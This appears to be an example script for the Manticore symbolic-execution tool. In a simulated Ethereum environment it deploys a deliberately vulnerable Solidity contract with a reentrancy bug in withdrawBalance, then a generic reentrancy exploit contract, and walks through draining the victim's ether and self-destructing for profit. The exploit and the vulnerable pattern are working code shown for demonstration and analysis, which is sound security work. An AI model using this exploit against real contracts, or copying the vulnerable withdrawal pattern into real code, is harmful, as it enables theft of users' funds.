from manticore.ethereum import ABI, ManticoreEVM

################ Script #######################

m = ManticoreEVM()
m.verbosity(0)
# The contract account to analyze
contract_source_code = """
pragma solidity ^0.4.15;

contract Reentrance {
    mapping (address => uint) userBalance;

    function getBalance(address u) constant returns(uint){
        return userBalance[u];
    }

    function addToBalance() payable{
        userBalance[msg.sender] += msg.value;
    }

    function withdrawBalance(){
        // send userBalance[msg.sender] ethers to msg.sender
        // if mgs.sender is a contract, it will call its fallback function
        if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){
           revert();
        }
        userBalance[msg.sender] = 0;
    }
}
//Function signatures:
//c0e317fb: addToBalance()
//f8b2cb4f: getBalance(address)
//5fd8c710: withdrawBalance()
"""

exploit_source_code = """
pragma solidity ^0.4.15;

contract GenericReentranceExploit {
    int reentry_reps=10;
    address vulnerable_contract;
    address owner;
    bytes reentry_attack_string;

    function GenericReentranceExploit(){
        owner = msg.sender;
    }

    function set_vulnerable_contract(address _vulnerable_contract){
        vulnerable_contract = _vulnerable_contract ;
    }

    function set_reentry_attack_string(bytes _reentry_attack_string){
        reentry_attack_string = _reentry_attack_string;
    }

    function set_reentry_reps(int reps){
        reentry_reps = reps;
    }

    function proxycall(bytes data) payable{
        // call addToBalance with msg.value ethers
        vulnerable_contract.call.value(msg.value)(data);
    }

    function get_money(){
        selfdestruct(owner);
    }

    function () payable{
        // reentry_reps is used to execute the attack a number of times
        // otherwise there is a loop between withdrawBalance and the fallback function
        if (reentry_reps > 0){
            reentry_reps = reentry_reps - 1;
            vulnerable_contract.call(reentry_attack_string);
        }
    }
}
"""


# Initialize user and contracts
user_account = m.create_account(balance=100000000000000000)
attacker_account = m.create_account(balance=100000000000000000)

contract_account = m.solidity_create_contract(
    contract_source_code, owner=user_account
)  # Not payable
for i in m.all_states:
    i.platform.set_balance(contract_account, 1000000000000000000)  # give it some ether

exploit_account = m.solidity_create_contract(exploit_source_code, owner=attacker_account)

print("[+] Set up the exploit")
exploit_account.set_vulnerable_contract(contract_account)
exploit_account.set_reentry_reps(2)

print("[+] Setting attack string")
#'\x9d\x15\xfd\x17'+pack_msb(32)+pack_msb(4)+'\x5f\xd8\xc7\x10',
reentry_string = ABI.function_selector("withdrawBalance()")
exploit_account.set_reentry_attack_string(reentry_string)

print("[+] Initial world state")
for i in m.all_states:
    i = i.platform
    print(
        f" attacker_account {attacker_account.address:x} balance: {i.get_balance(attacker_account.address)}"
    )
    print(
        f" exploit_account {exploit_account.address} balance: {i.get_balance(exploit_account.address)}"
    )
    print(f" user_account {user_account.address:x} balance: {i.get_balance(user_account.address)}")
    print(
        f" contract_account {contract_account.address:x} balance: {i.get_balance(contract_account.address)}"
    )


# User deposits all in contract
print("[+] user deposited some.")
contract_account.addToBalance(value=100000000000000000)


print("[+] Let attacker deposit some small amount using exploit")
exploit_account.proxycall(ABI.function_selector("addToBalance()"), value=100000000000000000)

print("[+] Let attacker extract all using exploit")
exploit_account.proxycall(ABI.function_selector("withdrawBalance()"))

print("[+] Let attacker destroy the exploit contract and profit")
exploit_account.get_money()

for i in m.all_states:
    i = i.platform
    print(
        f" attacker_account {attacker_account.address:x} balance: {i.get_balance(attacker_account.address)}"
    )
    print(f" user_account {user_account.address:x} balance: {i.get_balance(user_account.address)}")
    print(
        f" contract_account {contract_account.address:x} balance: {i.get_balance(contract_account.address)}"
    )

m.finalize()
print(f"[+] Look for results in {m.workspace}")
